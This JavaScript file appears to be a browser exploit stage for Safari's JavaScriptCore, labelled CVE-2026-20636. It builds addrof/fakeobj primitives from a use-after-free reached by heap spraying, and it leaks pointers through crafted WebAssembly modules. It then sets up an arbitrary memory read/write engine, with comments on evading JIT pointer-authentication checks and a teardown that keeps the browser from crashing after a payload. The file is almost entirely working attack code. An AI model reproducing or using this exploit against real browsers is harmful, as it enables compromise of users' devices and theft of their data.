// ============================================================
// CVE-2026-20636 — WASM R/W (No describe)
// Extracts AAW/AAR Phase 0 - Phase 7
// ============================================================

window.init_wasm_rw = async function () {
    print("=== CVE-2026-20636: WASM R/W Module Initializing ===\n");

    const convBuf = new ArrayBuffer(8);
    const f64 = new Float64Array(convBuf);
    const u32 = new Uint32Array(convBuf);
    function f2i(f) { f64[0] = f; return BigInt(u32[0]) | (BigInt(u32[1]) << 32n); }
    function i2f(i) { u32[0] = Number(i & 0xFFFFFFFFn); u32[1] = Number((i >> 32n) & 0xFFFFFFFFn); return f64[0]; }
    window.f2i = f2i;
    window.i2f = i2f;
    window.lo32 = function (v) { return Number(v & 0xFFFFFFFFn); };
    window.hi32 = function (v) { return Number((v >> 32n) & 0xFFFFFFFFn); };
    if (!window.hex) window.hex = function (v) { return "0x" + (typeof v === "bigint" ? v.toString(16).padStart(16, "0") : v.toString(16)); };

    async function gcFull() {
        let x; for (let i = 0; i < 1000; i++) x = new ArrayBuffer(1024 * 1024);
        let arr = []; for (let i = 0; i < 100000; i++) arr.push({ a: i }); arr = null; x = null;
        await sleep(100);
    }
    async function gcEden() {
        let x; for (let i = 0; i < 100; i++) x = new ArrayBuffer(1024 * 1024);
        let arr = []; for (let i = 0; i < 50000; i++) arr.push({ a: i }); arr = null; x = null;
        await sleep(50);
    }

    // ── v128 WASM instance (for butterfly leak) ──
    print("[*] Building v128 WASM module...");

    function buildV128Module() {
        const b = [];
        const u8 = (...a) => b.push(...a);
        const leb = (n) => { while (n >= 0x80) { b.push((n & 0x7f) | 0x80); n >>>= 7; } b.push(n); };
        const sec = (id, fn) => { const s = b.length; fn(); const c = b.splice(s); u8(id); leb(c.length); b.push(...c); };
        function pleb(a, n) { while (n >= 0x80) { a.push((n & 0x7f) | 0x80); n >>>= 7; } a.push(n); }
        u8(0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00);
        sec(0x01, () => { leb(2); u8(0x60); leb(2); u8(0x7e, 0x7e); leb(0); u8(0x60); leb(0); leb(1); u8(0x7e); });
        sec(0x03, () => { leb(3); u8(0x00, 0x01, 0x01); });
        sec(0x06, () => { leb(1); u8(0x7b, 0x01); u8(0xfd); leb(12); for (let i = 0; i < 16; i++)u8(0); u8(0x0b); });
        sec(0x07, () => { leb(3); leb(1); u8(0x73); u8(0x00); leb(0); leb(1); u8(0x6c); u8(0x00); leb(1); leb(1); u8(0x68); u8(0x00); leb(2); });
        sec(0x0a, () => {
            leb(3);
            let f = [0x00, 0x20, 0x00]; f.push(0xfd); pleb(f, 18); f.push(0x20, 0x01); f.push(0xfd); pleb(f, 30); f.push(0x01, 0x24, 0x00, 0x0b); leb(f.length); b.push(...f);
            f = [0x00, 0x23, 0x00]; f.push(0xfd); pleb(f, 29); f.push(0x00, 0x0b); leb(f.length); b.push(...f);
            f = [0x00, 0x23, 0x00]; f.push(0xfd); pleb(f, 29); f.push(0x01, 0x0b); leb(f.length); b.push(...f);
        });
        return new Uint8Array(b);
    }

    const v128mod = new WebAssembly.Module(buildV128Module());
    const v128inst = new WebAssembly.Instance(v128mod);
    v128inst.exports.s(0xDEADBEEFn, 0xCAFEBABEn);
    let tlo = BigInt.asUintN(64, v128inst.exports.l());
    print("[+] v128 lo=" + hex(tlo) + (tlo === 0xDEADBEEFn ? " ✓" : " ✗"));
    if (tlo !== 0xDEADBEEFn) quit();

    window.v128inst = v128inst;

    // ── Portable globals WASM dual instances (for R/W engine) ──
    print("[*] Creating WASM dual instances (Portable globals)...");

    const wasmBytes = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x0d, 0x03, 0x60, 0x00, 0x01, 0x7f,
        0x60, 0x01, 0x7e, 0x00, 0x60, 0x01, 0x7f, 0x00,
        0x02, 0x11, 0x02,
        0x01, 0x65, 0x02, 0x67, 0x30, 0x03, 0x7e, 0x01,
        0x01, 0x65, 0x02, 0x67, 0x31, 0x03, 0x7f, 0x01,
        0x03, 0x05, 0x04, 0x00, 0x01, 0x00, 0x02,
        0x07, 0x11, 0x04,
        0x01, 0x61, 0x00, 0x00, 0x01, 0x62, 0x00, 0x01,
        0x01, 0x63, 0x00, 0x02, 0x01, 0x64, 0x00, 0x03,
        0x0a, 0x1a, 0x04,
        0x05, 0x00, 0x23, 0x00, 0xa7, 0x0b,
        0x06, 0x00, 0x20, 0x00, 0x24, 0x00, 0x0b,
        0x04, 0x00, 0x23, 0x01, 0x0b,
        0x06, 0x00, 0x20, 0x00, 0x24, 0x01, 0x0b,
    ]);

    const exe_g0 = new WebAssembly.Global({ value: 'i64', mutable: true }, 0n);
    const exe_g1 = new WebAssembly.Global({ value: 'i32', mutable: true }, 0);
    const nav_g0 = new WebAssembly.Global({ value: 'i64', mutable: true }, 0n);
    const nav_g1 = new WebAssembly.Global({ value: 'i32', mutable: true }, 0);

    const wasmModule = new WebAssembly.Module(wasmBytes.buffer);
    const executor = new WebAssembly.Instance(wasmModule, { e: { g0: exe_g0, g1: exe_g1 } });
    const navigator_ = new WebAssembly.Instance(wasmModule, { e: { g0: nav_g0, g1: nav_g1 } });
    print("[+] Dual instances created (Portable globals)");

    // JIT warmup → BBQ
    exe_g0.value = 0x41414141n; exe_g1.value = 0x42424242;
    nav_g0.value = 0xDEADBEEFn;
    exe_g1.value = 0x11111111; nav_g1.value = 0x22222222;
    for (let t = 0; t < 22; t++) {
        executor.exports.a(); executor.exports.b(BigInt(t));
        executor.exports.c(); executor.exports.d(t);
        navigator_.exports.a(); navigator_.exports.b(BigInt(t));
        navigator_.exports.c(); navigator_.exports.d(t);
    }
    exe_g0.value = 0xCAFEBABEn;
    if ((executor.exports.a() >>> 0) !== 0xCAFEBABE) { print("[-] BBQ JIT verify failed"); quit(); }
    print("[+] JIT warmup done (22 iters → BBQ)");
    exe_g0.value = 0n; exe_g1.value = 0; nav_g0.value = 0n; nav_g1.value = 0;

    window.executor = executor;
    window.navigator_ = navigator_;

    // ── Target arrays for bootstrap R/W ──
    let container = []; container.push(1.1); container.push(2.2); container.push(3.3); container.push(4.4);
    let structArr = []; structArr.push(1.1); structArr.push(2.2); structArr.push(3.3); structArr.push(4.4);

    await gcFull(); await gcFull(); await gcFull();
    print("[+] All objects promoted to old-gen");

    // ============================================================
    // Phase 0: UAF → addrof/fakeobj
    // ============================================================
    print("\n[*] Phase 0: UAF infrastructure...");

    const holder = { key: 1 };
    let map = new Map(); map.set({ 0: 1.1 }, 1);
    function inlinee(value, key) { holder.key = key; }
    if (typeof noFTL === 'undefined') window.noFTL = function () { };
    noFTL(inlinee);
    for (let i = 0; i < 5000; i++) map.forEach(inlinee);
    await gcFull(); await gcFull(); await gcFull();
    print("[+] DFG warmup done, holder in old-gen");

    function storeKey(marker) { let m = new Map([[{ 0: marker }, 1]]); m.forEach(inlinee); }
    function deepClobber(n) {
        let a0 = 0, a1 = 0, a2 = 0, a3 = 0, a4 = 0, a5 = 0, a6 = 0, a7 = 0;
        let b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0, b6 = 0, b7 = 0;
        let c0 = 0, c1 = 0, c2 = 0, c3 = 0, c4 = 0, c5 = 0, c6 = 0, c7 = 0;
        let d0 = 0, d1 = 0, d2 = 0, d3 = 0, d4 = 0, d5 = 0, d6 = 0, d7 = 0;
        if (n > 0) return deepClobber(n - 1); return a0 + b0 + c0 + d0;
    }
    for (let i = 0; i < 200000; i++) { let x = { 0: i * 1.1 }; }
    await gcEden();

    let hitSpray = null, hitRound = -1;
    for (let r = 0; r < 600; r++) {
        await gcEden();
        let drain = []; for (let j = 0; j < 4000; j++) drain.push([1.1]);
        storeKey(100.1 + r); deepClobber(300); deepClobber(300);
        // Cell sled: same-structure FinalObjects allocated AFTER {0:marker}.
        // Bump pointer puts them at HIGHER addresses than {0:marker}'s cell.
        // When freed together by gcEden: sled → freelist HEAD, {0:marker}.next = sled → non-null.
        // This prevents StructureID=0 crash on iPhone where {0:marker} ends up at freelist tail.
        let _cc = []; for (let k = 0; k < 64; k++) _cc.push({ 0: 0.0 }); _cc = null;
        await gcEden();
        let sp = []; for (let j = 0; j < 3000; j++) sp.push([{ _: 1 }]);
        drain = null;
        let val; try { val = holder.key[0]; } catch (e) { continue; }
        if (typeof val === "number" && Math.abs(val - (100.1 + r)) > 0.01) { hitSpray = sp; hitRound = r; break; }
        if (r % 20 === 0) print("[*] spray round " + r);
    }

    if (!hitSpray) { print("[-] Butterfly reuse failed"); quit(); }
    print("[+] Butterfly reuse round " + hitRound);

    let rawBits = f2i(holder.key[0]);
    let matchIdx = -1;
    for (let i = 0; i < hitSpray.length; i++) {
        let saved = hitSpray[i][0]; hitSpray[i][0] = { _u: true };
        if (f2i(holder.key[0]) !== rawBits) { matchIdx = i; hitSpray[i][0] = saved; break; }
        hitSpray[i][0] = saved;
    }
    if (matchIdx < 0) { print("[-] Match failed"); quit(); }
    print("[+] Matching spray: hitSpray[" + matchIdx + "]");

    function _addrof(obj) { hitSpray[matchIdx][0] = obj; return f2i(holder.key[0]); }
    function _fakeobj(addr) { holder.key[0] = i2f(addr); return hitSpray[matchIdx][0]; }

    window.addrof = _addrof;
    window.fakeobj = _fakeobj;

    // ============================================================
    // Phase 1: v128 Butterfly Leak (NO describe!)
    // ============================================================
    print("\n[*] Phase 1: v128 butterfly leak...");

    let containerAddr = _addrof(container);
    let structArrAddr = _addrof(structArr);
    let v128instAddr = _addrof(v128inst);
    let executorAddr = _addrof(executor);
    let navigatorAddr = _addrof(navigator_);

    // Fake JSCell header: SID=1, indexingType=0x07, jsType=0x25, inlineTypeFlags=0x01
    let fakeHeader = 1n | (0x07n << 32n) | (0x25n << 40n) | (0x01n << 56n);

    // Safari key: use new Function() to access fake objects (bypass JIT PAC checks)
    const _readElement = new Function('obj', 'idx', 'return obj[idx]');
    const _writeElement = new Function('obj', 'idx', 'val', 'obj[idx] = val');

    let V128_OFFSET = -1;
    let containerBF = 0n;
    let structArrBF = 0n;
    let scanHits = [];

    for (let off = 0x80; off <= 0x300; off += 8) {
        let cellAddr = v128instAddr + BigInt(off);

        v128inst.exports.s(fakeHeader, containerAddr + 8n);

        let bf_bits = 0n;
        try {
            let fake = _fakeobj(cellAddr);
            let v0 = _readElement(fake, 0);
            if (v0 === undefined) continue;
            bf_bits = f2i(v0);
        } catch (e) { continue; }

        if (bf_bits < 0x100000000n || bf_bits > 0x0000FFFFFFFFFFFFn || bf_bits === 0x7FF8000000000000n) {
            continue;
        }

        scanHits.push({ off, bf_bits });

        v128inst.exports.s(fakeHeader, structArrAddr + 8n);
        let sa_bf = 0n;
        try {
            let fake2 = _fakeobj(cellAddr);
            let sa_v0 = _readElement(fake2, 0);
            if (sa_v0 === undefined) continue;
            sa_bf = f2i(sa_v0);
        } catch (e) { continue; }

        let delta = sa_bf > bf_bits ? sa_bf - bf_bits : bf_bits - sa_bf;
        if (delta > 0x10000n) continue;

        container[0] = i2f(fakeHeader);
        container[1] = i2f(sa_bf);
        let testFake = _fakeobj(bf_bits);
        let testRead;
        try { testRead = _readElement(testFake, 0); } catch (e) { continue; }

        if (testRead === 1.1) {
            containerBF = bf_bits;
            structArrBF = sa_bf;
            V128_OFFSET = off;
            break;
        }
    }

    if (containerBF === 0n) {
        print("[-] v128 butterfly leak FAILED");
        quit();
    }

    // ============================================================
    // Phase 2: Bootstrap R/W (fake DoubleArray)
    // ============================================================
    print("\n[*] Phase 2: Bootstrap R/W...");

    container[0] = i2f(fakeHeader);
    container[1] = i2f(structArrBF);
    let fakeArr = _fakeobj(containerBF);

    let _anchors = [v128instAddr, executorAddr, navigatorAddr, containerAddr, structArrAddr].sort((a, b) => Number(a - b));

    function _findAnchor(addr) {
        for (let i = _anchors.length - 1; i >= 0; i--) {
            let a = _anchors[i];
            if (addr > a && ((addr - a) % 8n === 0n)) {
                let idx = Number((addr - a) / 8n) - 1;
                if (idx >= 0 && idx < 16000000) return [a, idx];
            }
        }
        return null;
    }

    function _bootstrap_read64(addr) {
        let anchor = _findAnchor(addr);
        if (anchor) {
            let [a, idx] = anchor;
            container[1] = i2f(a + 8n);
            let val = _readElement(fakeArr, idx);
            if (val !== undefined && !isNaN(val)) return f2i(val);
        }
        container[1] = i2f(addr + 8n);
        let val = _readElement(fakeArr, 0);
        if (val !== undefined && !isNaN(val)) return f2i(val);
        return 0xDEADn;
    }

    function _bootstrap_write64(addr, value) {
        let anchor = _findAnchor(addr);
        if (anchor) {
            let [a, idx] = anchor;
            container[1] = i2f(a + 8n);
            _writeElement(fakeArr, idx, i2f(value));
            return;
        }
        container[1] = i2f(addr);
        _writeElement(fakeArr, 0, i2f(value));
    }

    let testGC = _bootstrap_read64(containerAddr);
    if (testGC !== 0xDEADn && testGC !== 0n) {
        let realSID = testGC & 0xFFFFFFFFn;
        if (realSID > 0n && realSID < 0x10000000n) {
            fakeHeader = realSID | (0x07n << 32n) | (0x25n << 40n) | (0x01n << 56n);
            container[0] = i2f(fakeHeader);
            container[1] = i2f(structArrBF);
        }
    }

    // ============================================================
    // Phase 3 & 4: Locate Portable slots and set up final R/W
    // ============================================================
    print("\n[*] Phase 3: Setup Engine...");

    exe_g0.value = 0x4141414142424242n;
    exe_g1.value = 0x43434343;
    let g0_jsaddr = _addrof(exe_g0);
    let g1_jsaddr = _addrof(exe_g1);

    _anchors.push(g0_jsaddr, g1_jsaddr);
    _anchors.sort((a, b) => Number(a - b));

    function findGlobalValueAddr(jsAddr, marker, mask) {
        let wasmGlobalPtr = _bootstrap_read64(jsAddr + 16n);
        if (wasmGlobalPtr === 0xDEADn || wasmGlobalPtr === 0n || wasmGlobalPtr < 0x10000n || wasmGlobalPtr === 0x7FF8000000000000n) {
            for (let woff = 8; woff <= 56; woff += 8) {
                wasmGlobalPtr = _bootstrap_read64(jsAddr + BigInt(woff));
                if (wasmGlobalPtr !== 0xDEADn && wasmGlobalPtr !== 0n && wasmGlobalPtr > 0x10000n && wasmGlobalPtr !== 0x7FF8000000000000n) break;
            }
        }
        if (wasmGlobalPtr === 0xDEADn || wasmGlobalPtr < 0x10000n) return [0n, 0n];

        for (let goff = 0; goff < 96; goff += 8) {
            let v = _bootstrap_read64(wasmGlobalPtr + BigInt(goff));
            if (v !== 0xDEADn && (v & mask) === marker) {
                return [wasmGlobalPtr + BigInt(goff), wasmGlobalPtr];
            }
        }
        return [0n, wasmGlobalPtr];
    }

    let [g0ValueAddr, g0WasmPtr] = findGlobalValueAddr(g0_jsaddr, 0x4141414142424242n, 0xFFFFFFFFFFFFFFFFn);
    let [g1ValueAddr, g1WasmPtr] = findGlobalValueAddr(g1_jsaddr, 0x43434343n, 0xFFFFFFFFn);

    let exe_g0_slot_off = -1;
    let exe_g1_slot_off = -1;
    for (let off = 0; off < 576; off += 8) {
        let slot = _bootstrap_read64(executorAddr + BigInt(off));
        if (slot === 0xDEADn || slot === 0n) continue;

        if (exe_g0_slot_off < 0 && (slot > g0ValueAddr ? slot - g0ValueAddr : g0ValueAddr - slot) <= 16n) {
            if (_bootstrap_read64(slot) === 0x4141414142424242n) exe_g0_slot_off = off;
            else if (_bootstrap_read64(slot - 8n) === 0x4141414142424242n) exe_g0_slot_off = off;
        }

        if (exe_g1_slot_off < 0 && (slot > g1ValueAddr ? slot - g1ValueAddr : g1ValueAddr - slot) <= 16n) {
            if ((_bootstrap_read64(slot) & 0xFFFFFFFFn) === 0x43434343n) exe_g1_slot_off = off;
            else if ((_bootstrap_read64(slot - 8n) & 0xFFFFFFFFn) === 0x43434343n) exe_g1_slot_off = off;
        }
    }

    if (exe_g0_slot_off < 0 || exe_g1_slot_off < 0) quit();

    // Save navigator_'s original g0 slot pointer BEFORE redirect
    // (needed to restore it in teardown so WASM Instance destructor / GC don't crash)
    let _origNavG0Slot = _bootstrap_read64(navigatorAddr + BigInt(exe_g0_slot_off));

    _bootstrap_write64(navigatorAddr + BigInt(exe_g0_slot_off), executorAddr + BigInt(exe_g1_slot_off));

    // ============================================================
    // Phase 6: Export Final API
    // ============================================================
    window.read32 = function (addr) {
        navigator_.exports.b(addr);
        return executor.exports.c() >>> 0;
    };
    window.write32 = function (addr, val) {
        navigator_.exports.b(addr);
        executor.exports.d(val);
    };
    window.read64 = function (addr) {
        return BigInt(window.read32(addr)) | (BigInt(window.read32(addr + 4n)) << 32n);
    };
    window.write64 = function (addr, value) {
        window.write32(addr, window.lo32(value));
        window.write32(addr + 4n, window.hi32(value));
    };

    // ============================================================
    // Teardown: call this after payload to prevent post-exploit GC crash.
    //
    // Root cause of crash:
    //   JSC conservative GC scans native stack and may find containerBF
    //   (the fakeArr address). It reads container[1] as a butterfly pointer.
    //   After bootstrap ops, container[1] points into WASM Instance internals.
    //   GC follows this → invalid JSValues → SIGSEGV/SIGBUS.
    //
    // Fix:
    //   1. Restore navigator_'s g0 slot → clean WASM Instance destructor path.
    //   2. Restore container[1] = structArrBF → GC scans real float values [1.1..4.4].
    // ============================================================
    window.teardown_wasm_rw = function () {
        // Step 1: restore navigator_ g0 slot pointer using bootstrap write
        // (still works because container/fakeArr are still in scope here via closure)
        _bootstrap_write64(
            navigatorAddr + BigInt(exe_g0_slot_off),
            _origNavG0Slot
        );
        // Step 2: restore fakeArr butterfly to structArr's real element storage
        //         so any conservative GC scan of containerBF is harmless
        container[0] = i2f(fakeHeader);
        container[1] = i2f(structArrBF);
        // Disable R/W API (no longer valid after teardown)
        window.read32 = window.write32 = window.read64 = window.write64 = null;
    };

    print("[+] WASM R/W Engine Initialization Complete.");
    return true;
};
